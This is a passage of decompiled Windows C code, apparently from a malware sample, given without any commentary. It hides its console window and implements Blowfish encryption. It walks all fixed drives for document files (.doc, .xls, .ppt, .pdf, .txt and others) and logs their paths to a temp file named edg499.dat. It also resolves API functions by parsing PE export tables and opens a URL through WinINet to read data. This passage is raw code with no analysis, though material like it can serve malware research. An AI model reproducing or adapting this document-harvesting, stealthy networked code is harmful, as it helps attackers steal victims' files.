    int32_t v63 = *(int32_t *)((4 * v60 & 1020) + v14); // 0x406710
    int32_t v64 = *(int32_t *)(a1 + 40); // 0x406719
    uint32_t v65 = (v61 + *(int32_t *)((v60 / 0x4000 & 1020) + v7) ^ v62) + v63 ^ v55 ^ v64; // 0x40671c
    int32_t v66 = *(int32_t *)(4 * v65 / 0x1000000 + v9); // 0x406735
    int32_t v67 = *(int32_t *)((v65 / 64 & 1020) + v12); // 0x406743
    int32_t v68 = *(int32_t *)((4 * v65 & 1020) + v14); // 0x40674d
    int32_t v69 = *(int32_t *)(a1 + 44); // 0x406756
    uint32_t v70 = (v66 + *(int32_t *)((v65 / 0x4000 & 1020) + v7) ^ v67) + v68 ^ v60 ^ v69; // 0x406759
    int32_t v71 = *(int32_t *)(4 * v70 / 0x1000000 + v9); // 0x406772
    int32_t v72 = *(int32_t *)((v70 / 64 & 1020) + v12); // 0x406780
    int32_t v73 = *(int32_t *)((4 * v70 & 1020) + v14); // 0x40678a
    int32_t v74 = *(int32_t *)(a1 + 48); // 0x406793
    uint32_t v75 = (v71 + *(int32_t *)((v70 / 0x4000 & 1020) + v7) ^ v72) + v73 ^ v65 ^ v74; // 0x406796
    int32_t v76 = *(int32_t *)(4 * v75 / 0x1000000 + v9); // 0x4067af
    int32_t v77 = *(int32_t *)((v75 / 64 & 1020) + v12); // 0x4067bd
    int32_t v78 = *(int32_t *)((4 * v75 & 1020) + v14); // 0x4067c7
    int32_t v79 = *(int32_t *)(a1 + 52); // 0x4067d0
    uint32_t v80 = (v76 + *(int32_t *)((v75 / 0x4000 & 1020) + v7) ^ v77) + v78 ^ v70 ^ v79; // 0x4067d3
    int32_t v81 = *(int32_t *)(4 * v80 / 0x1000000 + v9); // 0x4067ec
    int32_t v82 = *(int32_t *)((v80 / 64 & 1020) + v12); // 0x4067fa
    int32_t v83 = *(int32_t *)((4 * v80 & 1020) + v14); // 0x406804
    int32_t v84 = *(int32_t *)(a1 + 56); // 0x40680d
    uint32_t v85 = (v81 + *(int32_t *)((v80 / 0x4000 & 1020) + v7) ^ v82) + v83 ^ v75 ^ v84; // 0x406810
    int32_t v86 = *(int32_t *)((v85 / 0x4000 & 1020) + v7); // 0x406825
    int32_t v87 = *(int32_t *)(4 * v85 / 0x1000000 + v9); // 0x40682c
    int32_t v88 = *(int32_t *)(a1 + 60); // 0x406844
    int32_t v89 = *(int32_t *)((4 * v85 & 1020) + v14); // 0x406847
    uint32_t v90 = v88 ^ v80 ^ v89 + (v87 + v86 ^ *(int32_t *)((v85 / 64 & 1020) + v12)); // 0x406853
    int32_t v91 = *(int32_t *)((v90 / 0x4000 & 1020) + v7); // 0x406865
    int32_t v92 = *(int32_t *)(4 * v90 / 0x1000000 + v9); // 0x40686c
    int32_t v93 = *(int32_t *)((v90 / 64 & 1020) + v12); // 0x40687a
    uint32_t v94 = *(int32_t *)(a1 + 68) ^ v90; // 0x406884
    int32_t v95 = *(int32_t *)(a1 + 64); // 0x406890
    uint32_t v96 = v95 ^ v85 ^ *(int32_t *)((4 * v90 & 1020) + v14) + (v92 + v91 ^ v93); // 0x406893
    int32_t v97; // 0x406470
    *(char *)v97 = (char)(v94 / 0x1000000);
    *(char *)(v97 + 1) = (char)(v94 / 0x10000);
    *(char *)(v97 + 2) = (char)(v94 / 256);
    *(char *)(v97 + 4) = (char)(v96 / 0x1000000);
    *(char *)(v97 + 5) = (char)(v96 / 0x10000);
    uint32_t result = v96 / 256; // 0x4068be
    *(char *)(v97 + 3) = (char)v94;
    *(char *)(v97 + 6) = (char)result;
    *(char *)(v97 + 7) = (char)v96;
    return result;
}

// Address range: 0x4068d0 - 0x406d30
int32_t function_4068d0(int32_t a1) {
    // 0x4068d0
    int32_t v1; // 0x4068d0
    unsigned char v2 = *(char *)(v1 + 1); // 0x4068e2
    unsigned char v3 = *(char *)(v1 + 2); // 0x4068eb
    unsigned char v4 = *(char *)(v1 + 3); // 0x4068f4
    int32_t v5 = *(int32_t *)(a1 + 68); // 0x4068fd
    uint32_t v6 = (256 * (256 * (256 * v1 & 0xff00 | (int32_t)v2) | (int32_t)v3) | (int32_t)v4) ^ v5; // 0x4068fd
    int32_t v7 = a1 + 1096; // 0x406910
    int32_t v8 = *(int32_t *)((v6 / 0x4000 & 1020) + v7); // 0x406910
    int32_t v9 = a1 + 72; // 0x406917
    int32_t v10 = *(int32_t *)(4 * v6 / 0x1000000 + v9); // 0x406917
    unsigned char v11 = *(char *)(v1 + 4); // 0x40691d
    int32_t v12 = a1 + 2120; // 0x40692c
    int32_t v13 = *(int32_t *)((v6 / 64 & 1020) + v12); // 0x40692c
    int32_t v14 = a1 + 3144; // 0x406936
    int32_t v15 = *(int32_t *)((4 * v6 & 1020) + v14); // 0x406936
    unsigned char v16 = *(char *)(v1 + 5); // 0x40693d
    unsigned char v17 = *(char *)(v1 + 6); // 0x406943
    unsigned char v18 = *(char *)(v1 + 7); // 0x40694c
    int32_t v19 = *(int32_t *)(a1 + 64); // 0x406957
    uint32_t v20 = v19 ^ (v13 ^ v10 + v8) + v15 ^ (256 * (256 * (256 * (int32_t)v11 | (int32_t)v16) | (int32_t)v17) | (int32_t)v18); // 0x406957
    int32_t v21 = *(int32_t *)(4 * v20 / 0x1000000 + v9); // 0x406971
    int32_t v22 = *(int32_t *)((v20 / 64 & 1020) + v12); // 0x40697f
    int32_t v23 = *(int32_t *)((4 * v20 & 1020) + v14); // 0x406989
    int32_t v24 = *(int32_t *)(a1 + 60); // 0x406992
    uint32_t v25 = (v21 + *(int32_t *)((v20 / 0x4000 & 1020) + v7) ^ v22) + v23 ^ v6 ^ v24; // 0x406995
    int32_t v26 = *(int32_t *)(4 * v25 / 0x1000000 + v9); // 0x4069ae
    int32_t v27 = *(int32_t *)((v25 / 64 & 1020) + v12); // 0x4069bc
    int32_t v28 = *(int32_t *)((4 * v25 & 1020) + v14); // 0x4069c6
    int32_t v29 = *(int32_t *)(a1 + 56); // 0x4069cf
    uint32_t v30 = (v26 + *(int32_t *)((v25 / 0x4000 & 1020) + v7) ^ v27) + v28 ^ v20 ^ v29; // 0x4069d2
    int32_t v31 = *(int32_t *)(4 * v30 / 0x1000000 + v9); // 0x4069eb
    int32_t v32 = *(int32_t *)((v30 / 64 & 1020) + v12); // 0x4069f9
    int32_t v33 = *(int32_t *)((4 * v30 & 1020) + v14); // 0x406a03
    int32_t v34 = *(int32_t *)(a1 + 52); // 0x406a0c
    uint32_t v35 = (v31 + *(int32_t *)((v30 / 0x4000 & 1020) + v7) ^ v32) + v33 ^ v25 ^ v34; // 0x406a0f
    int32_t v36 = *(int32_t *)(4 * v35 / 0x1000000 + v9); // 0x406a28
    int32_t v37 = *(int32_t *)((v35 / 64 & 1020) + v12); // 0x406a36
    int32_t v38 = *(int32_t *)((4 * v35 & 1020) + v14); // 0x406a40
    int32_t v39 = *(int32_t *)(a1 + 48); // 0x406a49
    uint32_t v40 = (v36 + *(int32_t *)((v35 / 0x4000 & 1020) + v7) ^ v37) + v38 ^ v30 ^ v39; // 0x406a4c
    int32_t v41 = *(int32_t *)(4 * v40 / 0x1000000 + v9); // 0x406a65
    int32_t v42 = *(int32_t *)((v40 / 64 & 1020) + v12); // 0x406a73
    int32_t v43 = *(int32_t *)((4 * v40 & 1020) + v14); // 0x406a7d
    int32_t v44 = *(int32_t *)(a1 + 44); // 0x406a86
    uint32_t v45 = (v41 + *(int32_t *)((v40 / 0x4000 & 1020) + v7) ^ v42) + v43 ^ v35 ^ v44; // 0x406a89
    int32_t v46 = *(int32_t *)(4 * v45 / 0x1000000 + v9); // 0x406aa2
    int32_t v47 = *(int32_t *)((v45 / 64 & 1020) + v12); // 0x406ab0
    int32_t v48 = *(int32_t *)((4 * v45 & 1020) + v14); // 0x406aba
    int32_t v49 = *(int32_t *)(a1 + 40); // 0x406ac3
    uint32_t v50 = (v46 + *(int32_t *)((v45 / 0x4000 & 1020) + v7) ^ v47) + v48 ^ v40 ^ v49; // 0x406ac6
    int32_t v51 = *(int32_t *)(4 * v50 / 0x1000000 + v9); // 0x406adf
    int32_t v52 = *(int32_t *)((v50 / 64 & 1020) + v12); // 0x406aed
    int32_t v53 = *(int32_t *)((4 * v50 & 1020) + v14); // 0x406af7
    int32_t v54 = *(int32_t *)(a1 + 36); // 0x406b00
    uint32_t v55 = (v51 + *(int32_t *)((v50 / 0x4000 & 1020) + v7) ^ v52) + v53 ^ v45 ^ v54; // 0x406b03
    int32_t v56 = *(int32_t *)(4 * v55 / 0x1000000 + v9); // 0x406b1c
    int32_t v57 = *(int32_t *)((v55 / 64 & 1020) + v12); // 0x406b2a
    int32_t v58 = *(int32_t *)((4 * v55 & 1020) + v14); // 0x406b34
    int32_t v59 = *(int32_t *)(a1 + 32); // 0x406b3d
    uint32_t v60 = (v56 + *(int32_t *)((v55 / 0x4000 & 1020) + v7) ^ v57) + v58 ^ v50 ^ v59; // 0x406b40
    int32_t v61 = *(int32_t *)(4 * v60 / 0x1000000 + v9); // 0x406b59
    int32_t v62 = *(int32_t *)((v60 / 64 & 1020) + v12); // 0x406b67
    int32_t v63 = *(int32_t *)((4 * v60 & 1020) + v14); // 0x406b71
    int32_t v64 = *(int32_t *)(a1 + 28); // 0x406b7a
    uint32_t v65 = (v61 + *(int32_t *)((v60 / 0x4000 & 1020) + v7) ^ v62) + v63 ^ v55 ^ v64; // 0x406b7d
    int32_t v66 = *(int32_t *)(4 * v65 / 0x1000000 + v9); // 0x406b96
    int32_t v67 = *(int32_t *)((v65 / 64 & 1020) + v12); // 0x406ba4
    int32_t v68 = *(int32_t *)((4 * v65 & 1020) + v14); // 0x406bae
    int32_t v69 = *(int32_t *)(a1 + 24); // 0x406bb7
    uint32_t v70 = (v66 + *(int32_t *)((v65 / 0x4000 & 1020) + v7) ^ v67) + v68 ^ v60 ^ v69; // 0x406bba
    int32_t v71 = *(int32_t *)(4 * v70 / 0x1000000 + v9); // 0x406bd3
    int32_t v72 = *(int32_t *)((v70 / 64 & 1020) + v12); // 0x406be1
    int32_t v73 = *(int32_t *)((4 * v70 & 1020) + v14); // 0x406beb
    int32_t v74 = *(int32_t *)(a1 + 20); // 0x406bf4
    uint32_t v75 = (v71 + *(int32_t *)((v70 / 0x4000 & 1020) + v7) ^ v72) + v73 ^ v65 ^ v74; // 0x406bf7
    int32_t v76 = *(int32_t *)(4 * v75 / 0x1000000 + v9); // 0x406c10
    int32_t v77 = *(int32_t *)((v75 / 64 & 1020) + v12); // 0x406c1e
    int32_t v78 = *(int32_t *)((4 * v75 & 1020) + v14); // 0x406c28
    int32_t v79 = *(int32_t *)(a1 + 16); // 0x406c31
    uint32_t v80 = (v76 + *(int32_t *)((v75 / 0x4000 & 1020) + v7) ^ v77) + v78 ^ v70 ^ v79; // 0x406c34
    int32_t v81 = *(int32_t *)(4 * v80 / 0x1000000 + v9); // 0x406c4d
    int32_t v82 = *(int32_t *)((v80 / 64 & 1020) + v12); // 0x406c5b
    int32_t v83 = *(int32_t *)((4 * v80 & 1020) + v14); // 0x406c65
    int32_t v84 = *(int32_t *)(a1 + 12); // 0x406c6e
    uint32_t v85 = (v81 + *(int32_t *)((v80 / 0x4000 & 1020) + v7) ^ v82) + v83 ^ v75 ^ v84; // 0x406c71
    int32_t v86 = *(int32_t *)((v85 / 0x4000 & 1020) + v7); // 0x406c86
    int32_t v87 = *(int32_t *)(4 * v85 / 0x1000000 + v9); // 0x406c8d
    int32_t v88 = *(int32_t *)(a1 + 8); // 0x406ca5
    int32_t v89 = *(int32_t *)((4 * v85 & 1020) + v14); // 0x406ca8
    uint32_t v90 = v88 ^ v80 ^ v89 + (v87 + v86 ^ *(int32_t *)((v85 / 64 & 1020) + v12)); // 0x406cb4
    int32_t v91 = *(int32_t *)((v90 / 0x4000 & 1020) + v7); // 0x406cc6
    int32_t v92 = *(int32_t *)(4 * v90 / 0x1000000 + v9); // 0x406ccd
    int32_t v93 = *(int32_t *)((v90 / 64 & 1020) + v12); // 0x406cdb
    uint32_t v94 = *(int32_t *)a1 ^ v90; // 0x406ce5
    int32_t v95 = *(int32_t *)(a1 + 4); // 0x406cf0
    uint32_t v96 = v95 ^ v85 ^ *(int32_t *)((4 * v90 & 1020) + v14) + (v92 + v91 ^ v93); // 0x406cf3
    int32_t v97; // 0x4068d0
    *(char *)v97 = (char)(v94 / 0x1000000);
    *(char *)(v97 + 1) = (char)(v94 / 0x10000);
    *(char *)(v97 + 2) = (char)(v94 / 256);
    *(char *)(v97 + 4) = (char)(v96 / 0x1000000);
    *(char *)(v97 + 5) = (char)(v96 / 0x10000);
    uint32_t result = v96 / 256; // 0x406d1e
    *(char *)(v97 + 3) = (char)v94;
    *(char *)(v97 + 6) = (char)result;
    *(char *)(v97 + 7) = (char)v96;
    return result;
}

// Address range: 0x406d30 - 0x406ee3
int32_t function_406d30(void) {
    // 0x406d30
    int32_t v1; // 0x406d30
    __asm_movdqu_10(*(int128_t *)&v1, __asm_movdqu(0x370734413198a2e85a308d3243f6a88));
    int32_t v2; // 0x406d30
    __asm_movdqu_10(*(int128_t *)(v2 + 16), __asm_movdqu(g2));
    __asm_movdqu_10(*(int128_t *)(v2 + 32), __asm_movdqu(g3));
    __asm_movdqu_10(*(int128_t *)(v2 + 48), __asm_movdqu(g4));
    __asm_movq_9(*(int64_t *)(v2 + 64), __asm_movq(-0x768604e46de92a27));
    _memcpy2();
    int32_t v3 = 0; // 0x406db2
    int32_t v4 = 2; // 0x406db2
    int32_t v5 = v4 - 2; // 0x406db7
    int32_t v6 = v4 - 1; // 0x406dbd
    int32_t v7; // 0x406d30
    unsigned char v8 = *(char *)(v7 + (int32_t)((0x100000000 * (int64_t)(v5 >> 31) | (int64_t)v5) % 24)); // 0x406dc0
    unsigned char v9 = *(char *)(v7 + (int32_t)((0x100000000 * (int64_t)(v6 >> 31) | (int64_t)v6) % 24)); // 0x406dcb
    unsigned char v10 = *(char *)(v4 % 24 + v7); // 0x406dda
    unsigned char v11 = *(char *)((v4 | 1) % 24 + v7); // 0x406ded
    int32_t * v12 = (int32_t *)(4 * v3 + v2); // 0x406df6
    int32_t v13 = *v12; // 0x406df6
    *v12 = (256 * (256 * (256 * (int32_t)v8 | (int32_t)v9) | (int32_t)v10) | (int32_t)v11) ^ v13;
    v3++;
    v4 += 4;
    while (v3 != 18) {
        // 0x406db7
        v5 = v4 - 2;
        v6 = v4 - 1;
        v8 = *(char *)(v7 + (int32_t)((0x100000000 * (int64_t)(v5 >> 31) | (int64_t)v5) % 24));
        v9 = *(char *)(v7 + (int32_t)((0x100000000 * (int64_t)(v6 >> 31) | (int64_t)v6) % 24));
        v10 = *(char *)(v4 % 24 + v7);
        v11 = *(char *)((v4 | 1) % 24 + v7);
        v12 = (int32_t *)(4 * v3 + v2);
        v13 = *v12;
        *v12 = (256 * (256 * (256 * (int32_t)v8 | (int32_t)v9) | (int32_t)v10) | (int32_t)v11) ^ v13;
        v3++;
        v4 += 4;
    }
    // 0x406e07
    unsigned char v14; // 0x406d30
    unsigned char v15; // 0x406d30
    int32_t v16 = 256 * (int32_t)v15 | (int32_t)v14;
    unsigned char v17; // 0x406d30
    unsigned char v18; // 0x406d30
    int32_t v19 = 256 * (0x10000 * (int32_t)v18 | (int32_t)v17);
    for (int32_t i = 0; i < 18; i += 2) {
        // 0x406e10
        function_406470((int32_t)&g32);
        int32_t v20 = 4 * i + v2;
        *(int32_t *)v20 = v16;
        *(int32_t *)(v20 + 4) = v19;
    }
    int32_t v21 = v2 + 76; // 0x406e6e
    for (int32_t i = 4; i > 0; i--) {
        int32_t v22 = 128; // 0x406e7a
        function_406470((int32_t)&g32);
        *(int32_t *)(v21 - 4) = v16;
        *(int32_t *)v21 = v19;
        v21 += 8;
        v22--;
        int32_t v23 = v21; // 0x406ed5
        while (v22 != 0) {
            // 0x406e80
            function_406470((int32_t)&g32);
            *(int32_t *)(v23 - 4) = v16;
            *(int32_t *)v23 = v19;
            v21 = v23 + 8;
            v22--;
            v23 = v21;
        }
    }
    // 0x406edc
    return 0;
}

// Address range: 0x406ef0 - 0x406f07
int main(int argc, char ** argv) {
    // 0x406ef0
    ShowWindow(GetConsoleWindow(), (int32_t)&g32);
    function_40a7f0((int32_t)&g32);
    return 0;
}

// Address range: 0x406f10 - 0x406f6e
int32_t function_406f10(void) {
    // 0x406f10
    int32_t v1; // 0x406f10
    int32_t v2 = *(int32_t *)(v1 + 120 + *(int32_t *)(v1 + 60)) + v1; // 0x406f25
    int32_t v3 = *(int32_t *)(v2 + 32); // 0x406f2a
    int32_t v4 = *(int32_t *)(v2 + 24) - 1; // 0x406f32
    int32_t v5 = -1; // 0x406f33
    if (v4 >= 0) {
        // 0x406f35
        int32_t v6; // bp-24, 0x406f10
        int32_t v7 = &v6; // 0x406f3b
        int32_t v8 = v4; // 0x406f46
        v7 -= 8;
        *(int32_t *)v7 = *(int32_t *)(v3 + v1 + 4 * v8) + v1;
        int32_t v9 = lstrcmpA((char *)&g32, (char *)&g32); // 0x406f3c
        v5 = v8;
        while (v9 != 0) {
            // 0x406f46
            v8--;
            v5 = -1;
            if (v8 < 0) {
                // break -> 0x406f4f
                break;
            }
            v7 -= 8;
            *(int32_t *)v7 = *(int32_t *)(v3 + v1 + 4 * v8) + v1;
            v9 = lstrcmpA((char *)&g32, (char *)&g32);
            v5 = v8;
        }
    }
    uint16_t v10 = *(int16_t *)(2 * v5 + v1 + *(int32_t *)(v2 + 36)); // 0x406f58
    int32_t v11 = *(int32_t *)(*(int32_t *)(v2 + 28) + v1 + 4 * (int32_t)v10); // 0x406f62
    return v11 + v1;
}

// Address range: 0x408cb0 - 0x408f2a
int32_t function_408cb0(void) {
    // 0x408cb0
    __chkstk();
    int32_t lpOut; // 0x408cb0
    wsprintfW((int16_t *)lpOut, (int16_t *)&g32);
    int32_t lpFileName; // bp-4108, 0x408cb0
    int16_t * v1 = (int16_t *)&lpFileName; // bp-24, 0x408cf7
    char lpFindFileData; // bp-8796, 0x408cb0
    int32_t * v2 = FindFirstFileW((int16_t *)&lpFileName, (struct _WIN32_FIND_DATAW *)&lpFindFileData); // 0x408cf8
    if (v2 == (int32_t *)-1) {
        // 0x408d09
        return _40___security_check_cookie_40_4();
    }
    // 0x408d30
    int32_t v3; // bp-4, 0x408cb0
    int32_t v4 = &v3; // 0x408cb1
    int32_t v5 = (int32_t)v2; // 0x408cf8
    int32_t v6; // bp-8752, 0x408cb0
    int32_t v7 = &v6; // 0x408d3b
    int32_t v8 = &lpFileName;
    int32_t v9 = v4 - 0x2234;
    int32_t v10; // bp-8204, 0x408cb0
    int32_t v11 = &v10;
    int32_t v12 = (int32_t)&v1; // 0x408ef7
    int32_t v13; // 0x408cb0
    int32_t v14; // 0x408cb0
    while (true) {
      lab_0x408d30:;
        int32_t v15 = v12;
        *(int32_t *)(v15 - 4) = (int32_t)&g5;
        int32_t v16 = v15 - 8; // 0x408d3b
        *(int32_t *)v16 = v7;
        int32_t v17 = lstrcmpW((int16_t *)&g32, (int16_t *)&g32); // 0x408d3c
        v14 = v16;
        if (v17 == 0) {
            goto lab_0x408ef0;
        } else {
            // 0x408d46
            *(int32_t *)(v15 - 12) = (int32_t)L"..";
            int32_t v18 = v15 - 16; // 0x408d51
            *(int32_t *)v18 = v7;
            int32_t v19 = lstrcmpW((int16_t *)&g32, (int16_t *)&g32); // 0x408d52
            v14 = v18;
            if (v19 == 0) {
                goto lab_0x408ef0;
            } else {
                int32_t * v20 = (int32_t *)(v15 - 20); // 0x408d62
                *v20 = v7;
                int32_t v21 = v15 - 28; // 0x408d6f
                int32_t * v22 = (int32_t *)v21; // 0x408d6f
                *v22 = (int32_t)L"%s\\%s";
                int32_t * v23 = (int32_t *)(v15 - 32); // 0x408d74
                *v23 = v8;
                wsprintfW((int16_t *)&g32, (int16_t *)&g32);
                if ((lpFindFileData & 16) == 0) {
                    // 0x408d93
                    *v20 = (int32_t)L".txt";
                    *(int32_t *)(v15 - 24) = v7;
                    *v22 = 2 * lstrlenW((int16_t *)&g32) + v9;
                    int32_t v24 = lstrcmpW((int16_t *)&g32, (int16_t *)&g32); // 0x408da9
                    v13 = v21;
                    if (v24 == 0) {
                        goto lab_0x408e9f;
                    } else {
                        // 0x408db3
                        *v23 = (int32_t)L".doc";
                        *(int32_t *)(v15 - 36) = v7;
                        int32_t v25 = lstrlenW((int16_t *)&g32); // 0x408dbf
                        int32_t v26 = v15 - 40; // 0x408dc8
                        *(int32_t *)v26 = 2 * v25 + v9;
                        int32_t v27 = lstrcmpW((int16_t *)&g32, (int16_t *)&g32); // 0x408dc9
                        v13 = v26;
                        if (v27 == 0) {
                            goto lab_0x408e9f;
                        } else {
                            // 0x408dd3
                            *(int32_t *)(v15 - 44) = (int32_t)L".xls";
                            *(int32_t *)(v15 - 48) = v7;
                            int32_t v28 = lstrlenW((int16_t *)&g32); // 0x408ddf
                            int32_t v29 = v15 - 52; // 0x408de8
                            *(int32_t *)v29 = 2 * v28 + v9;
                            int32_t v30 = lstrcmpW((int16_t *)&g32, (int16_t *)&g32); // 0x408de9
                            v13 = v29;
                            if (v30 == 0) {
                                goto lab_0x408e9f;
                            } else {
                                // 0x408df3
                                *(int32_t *)(v15 - 56) = (int32_t)L".xlsx";
                                *(int32_t *)(v15 - 60) = v7;
                                int32_t v31 = lstrlenW((int16_t *)&g32); // 0x408dff
                                int32_t v32 = v15 - 64; // 0x408e08
                                *(int32_t *)v32 = 2 * v31 + v9;
                                int32_t v33 = lstrcmpW((int16_t *)&g32, (int16_t *)&g32); // 0x408e09
                                v13 = v32;
                                if (v33 == 0) {
                                    goto lab_0x408e9f;
                                } else {
                                    // 0x408e13
                                    *(int32_t *)(v15 - 68) = (int32_t)L".docx";
                                    *(int32_t *)(v15 - 72) = v7;
                                    int32_t v34 = lstrlenW((int16_t *)&g32); // 0x408e1f
                                    int32_t v35 = v15 - 76; // 0x408e28
                                    *(int32_t *)v35 = v4 - 0x2236 + 2 * v34;
                                    int32_t v36 = lstrcmpW((int16_t *)&g32, (int16_t *)&g32); // 0x408e29
                                    v13 = v35;
                                    if (v36 == 0) {
                                        goto lab_0x408e9f;
                                    } else {
                                        // 0x408e2f
                                        *(int32_t *)(v15 - 80) = (int32_t)L".xls";
                                        *(int32_t *)(v15 - 84) = v7;
                                        int32_t v37 = lstrlenW((int16_t *)&g32); // 0x408e3b
                                        int32_t v38 = v15 - 88; // 0x408e44
                                        *(int32_t *)v38 = 2 * v37 + v9;
                                        int32_t v39 = lstrcmpW((int16_t *)&g32, (int16_t *)&g32); // 0x408e45
                                        v13 = v38;
                                        if (v39 == 0) {
                                            goto lab_0x408e9f;
                                        } else {
                                            // 0x408e4b
                                            *(int32_t *)(v15 - 92) = (int32_t)L".ppt";
                                            *(int32_t *)(v15 - 96) = v7;
                                            int32_t v40 = lstrlenW((int16_t *)&g32); // 0x408e57
                                            int32_t v41 = v15 - 100; // 0x408e60
                                            *(int32_t *)v41 = 2 * v40 + v9;
                                            int32_t v42 = lstrcmpW((int16_t *)&g32, (int16_t *)&g32); // 0x408e61
                                            v13 = v41;
                                            if (v42 == 0) {
                                                goto lab_0x408e9f;
                                            } else {
                                                // 0x408e67
                                                *(int32_t *)(v15 - 104) = (int32_t)L".pptx";
                                                *(int32_t *)(v15 - 108) = v7;
                                                int32_t v43 = lstrlenW((int16_t *)&g32); // 0x408e73
                                                int32_t v44 = v15 - 112; // 0x408e7c
                                                *(int32_t *)v44 = 2 * v43 + v9;
                                                int32_t v45 = lstrcmpW((int16_t *)&g32, (int16_t *)&g32); // 0x408e7d
                                                v13 = v44;
                                                if (v45 == 0) {
                                                    goto lab_0x408e9f;
                                                } else {
                                                    // 0x408e83
                                                    *(int32_t *)(v15 - 116) = (int32_t)L".pdf";
                                                    *(int32_t *)(v15 - 120) = v7;
                                                    int32_t v46 = lstrlenW((int16_t *)&g32); // 0x408e8f
                                                    int32_t v47 = v15 - 124; // 0x408e98
                                                    *(int32_t *)v47 = 2 * v46 + v9;
                                                    int32_t v48 = lstrcmpW((int16_t *)&g32, (int16_t *)&g32); // 0x408e99
                                                    v13 = v47;
                                                    v14 = v47;
                                                    if (v48 != 0) {
                                                        goto lab_0x408ef0;
                                                    } else {
                                                        goto lab_0x408e9f;
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                } else {
                    // 0x408d83
                    function_408cb0();
                    v14 = v18;
                    goto lab_0x408ef0;
                }
            }
        }
    }
  lab_0x408f0b:;
    // 0x408f0b
    int32_t v49; // 0x408cb0
    *(int32_t *)(v49 - 12) = v5;
    FindClose(&g32);
    return _40___security_check_cookie_40_4();
  lab_0x408ef0:
    // 0x408ef0
    v49 = v14;
    *(int32_t *)(v49 - 4) = (int32_t)&lpFindFileData;
    v12 = v49 - 8;
    *(int32_t *)v12 = v5;
    if (!FindNextFileW(&g32, (struct _WIN32_FIND_DATAW *)&g32)) {
        // break -> 0x408f0b
        goto lab_0x408f0b;
    }
    goto lab_0x408d30;
  lab_0x408e9f:;
    int32_t * v50 = (int32_t *)(v13 - 4); // 0x408ea5
    *v50 = v7;
    int32_t * v51 = (int32_t *)(v13 - 8); // 0x408ea6
    *v51 = (int32_t)"%s\n";
    _printf((char *)&g32);
    int32_t * v52 = (int32_t *)(v13 - 12); // 0x408eb6
    *v52 = v8;
    int32_t * v53 = (int32_t *)(v13 - 16); // 0x408ebd
    *v53 = (int32_t)L" \n%s \r\n";
    int32_t * v54 = (int32_t *)(v13 - 20); // 0x408ec2
    *v54 = v11;
    wsprintfW((int16_t *)&g32, (int16_t *)&g32);
    *v50 = v11;
    int32_t v55 = lstrlenW((int16_t *)&g32); // 0x408ecf
    *v51 = 0;
    int32_t v56; // bp-8808, 0x408cb0
    *v52 = (int32_t)&v56;
    *v53 = 2 * v55;
    *v54 = v11;
    int32_t v57 = v13 - 24; // 0x408ee4
    *(int32_t *)v57 = g31;
    WriteFile(&g32, &g32, (int32_t)&g32, &g32, (struct _OVERLAPPED *)&g32);
    v14 = v57;
    goto lab_0x408ef0;
}

// Address range: 0x408f30 - 0x408fa2
int32_t function_408f30(void) {
    int32_t v1 = 260; // bp-556, 0x408f4c
    int16_t lpBuffer; // bp-540, 0x408f30
    GetLogicalDriveStringsW(260, &lpBuffer);
    if (lpBuffer == 0) {
        // 0x408f92
        return _40___security_check_cookie_40_4();
    }
    int32_t v2 = &v1; // 0x408f70
    int32_t v3 = &lpBuffer; // 0x408f89
    v2 -= 4;
    *(int32_t *)v2 = v3;
    if (GetDriveTypeW((int16_t *)&g32) == 3) {
        // 0x408f78
        function_408cb0();
    }
    int32_t v4 = v3;
    int32_t v5 = v4 + 2; // 0x408f80
    while (*(int16_t *)v5 != 0) {
        // 0x408f80
        v4 = v5;
        v5 = v4 + 2;
    }
    // 0x408f89
    v3 = v4 + 4;
    while (*(int16_t *)v3 != 0) {
        // 0x408f70
        v2 -= 4;
        *(int32_t *)v2 = v3;
        if (GetDriveTypeW((int16_t *)&g32) == 3) {
            // 0x408f78
            function_408cb0();
        }
        // 0x408f80
        v4 = v3;
        v5 = v4 + 2;
        while (*(int16_t *)v5 != 0) {
            // 0x408f80
            v4 = v5;
            v5 = v4 + 2;
        }
        // 0x408f89
        v3 = v4 + 4;
    }
    // 0x408f92
    return _40___security_check_cookie_40_4();
}

// Address range: 0x408fb0 - 0x409047
int32_t function_408fb0(void) {
    int32_t lpBuffer = 0; // bp-276, 0x408fce
    int32_t v1; // bp-275, 0x408fb0
    _memset(&v1, 0, 259);
    GetTempPathA(260, (char *)&lpBuffer);
    lstrcatA((char *)&lpBuffer, "edg499.dat");
    int32_t * fileHandle = CreateFileA((char *)&lpBuffer, 0x40000000, 0, NULL, 2, 128, NULL); // 0x40901d
    g31 = (int32_t)fileHandle;
    function_408f30();
    CloseHandle((int32_t *)g31);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x4098f0 - 0x409a27
int32_t function_4098f0(void) {
    // 0x4098f0
    __chkstk();
    int32_t v1 = 0; // bp-10012, 0x409921
    int16_t * v2 = NULL; // bp-10028, 0x409927
    int32_t * v3 = InternetOpenW(NULL, (int32_t)&g32, (int16_t *)&g32, (int16_t *)&g32, (int32_t)&g32); // 0x40992d
    if (v3 == NULL) {
        // 0x40995a
        return _40___security_check_cookie_40_4();
    }
    int32_t v4 = (int32_t)v3; // 0x40992d
    int32_t v5 = v4; // bp-60, 0x409948
    int32_t * v6 = InternetOpenUrlW(v3, (int16_t *)&g32, (int16_t *)&g32, (int32_t)&g32, (int32_t)&g32, (int32_t)&g32); // 0x409949
    if (v6 == NULL) {
        // 0x409953
        InternetCloseHandle(v3);
        // 0x40995a
        return _40___security_check_cookie_40_4();
    }
    int32_t v7 = (int32_t)v6; // 0x409949
    int32_t v8; // bp-10008, 0x4098f0
    int32_t v9 = &v8; // 0x409982
    int32_t v10 = 0; // 0x40996f
    int32_t v11 = 0;
    int32_t v12 = &v5;
    *(int32_t *)(v12 - 4) = (int32_t)&v1;
    *(int32_t *)(v12 - 8) = 0x2710;
    *(int32_t *)(v12 - 12) = v9;
    *(int32_t *)(v12 - 16) = v7;
    InternetReadFile(&g32, &g32, (int32_t)&g32, &g32);
    int32_t * v13 = (int32_t *)(v12 - 20); // 0x409992
    *v13 = v1 + v10;
    int32_t v14 = _3f__3f_2_40_YAPAXI_40_Z((int32_t)&g32); // 0x409993
    int32_t * v15 = (int32_t *)(v12 - 24); // 0x409998
    *v15 = v10;
    int32_t * v16 = (int32_t *)(v12 - 28); // 0x409999
    *v16 = v11;
    int32_t * v17 = (int32_t *)(v12 - 32); // 0x4099a1
    *v17 = v14;
    _memcpy2();
    int32_t v18 = v12 - 36; // 0x4099a7
